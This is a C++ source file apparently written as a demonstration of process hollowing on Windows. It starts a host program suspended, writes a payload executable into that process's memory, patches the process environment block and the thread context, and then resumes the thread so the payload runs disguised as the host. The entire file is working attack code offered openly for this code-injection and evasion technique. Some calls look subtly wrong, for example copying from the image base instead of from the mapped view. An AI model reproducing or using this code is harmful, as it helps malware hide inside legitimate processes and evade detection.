// Process-Hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <iostream>
#include <ImageHlp.h>
#include <winternl.h>

#pragma comment(lib, "imagehlp")
#pragma comment(lib, "ntdll")

int main(int argc, char* argv[])
{
    if (argc < 3) {
        printf( "Usage: Process-Hollowing.exe <host-file> <inject-file>\n");
        return 1;
    }

    // Create suspended process
    PROCESS_INFORMATION pi;
    STARTUPINFOA si{ sizeof(si) };

    printf("[i] Creating suspended process: %s\n", argv[1]);
    if (!CreateProcessA(nullptr, argv[1], nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    printf("[+] Process created (PID: %d)\n", pi.dwProcessId);

    // Read payload
    printf("[i] Reading payload: %s\n", argv[2]);
    HANDLE hFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open payload\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Read payload successfully\n");

    //
    auto newAddress = VirtualAllocEx(pi.hProcess, nullptr, GetFileSize(hFile, nullptr) + (1 << 20),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newAddress) {
        printf("virtualAllocEx failed!\n");
        return 1;
    }

    ULONG oldSize, newSize;
    ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;
    if (!ReBaseImage64(argv[2], nullptr, TRUE, FALSE, FALSE, 0, 
        &oldSize, &oldImageBase, &newSize, &newImageBase, 0)) {
        printf("Rebase64 failed!\n");
        return 1;
    }

    

    auto hMap = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMap) {
        printf("CreateFileMapping failed!\n");
        return 1;
    }

    CloseHandle(hFile);

    auto address = MapViewOfFileEx(hMap, FILE_MAP_READ, 0, 0, 0, newAddress);
    if (!address) {
        printf("MapViewOfFile failed!\n");
        return 1;
    }

    auto dosHeader = (PIMAGE_DOS_HEADER)address;
    auto ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)address + dosHeader->e_lfanew);
    auto sections = (PIMAGE_SECTION_HEADER)(ntHeader + 1);

    WriteProcessMemory(pi.hProcess, (PVOID)newAddress, (PVOID)ntHeader->OptionalHeader.ImageBase,
        ntHeader->OptionalHeader.SizeOfHeaders, nullptr);

    for (ULONG i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (PBYTE)newAddress + sections[i].VirtualAddress,
            PVOID(ntHeader->OptionalHeader.ImageBase + sections[i].PointerToRawData),
            sections[i].SizeOfRawData, nullptr);
    }

    PROCESS_BASIC_INFORMATION bi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &bi, sizeof(bi), nullptr);
    auto peb = bi.PebBaseAddress;

    WriteProcessMemory(pi.hProcess, (PBYTE)peb + 2 * sizeof(PVOID),
        &ntHeader->OptionalHeader.ImageBase, sizeof(PVOID), nullptr);

    CONTEXT context;
    context.ContextFlags = CONTEXT_INTEGER; //CONTEXT_FULL;
    GetThreadContext(pi.hThread, &context);
    context.Rcx = (ULONG64)newAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &context);

    ResumeThread(pi.hThread);

    return 0;
}

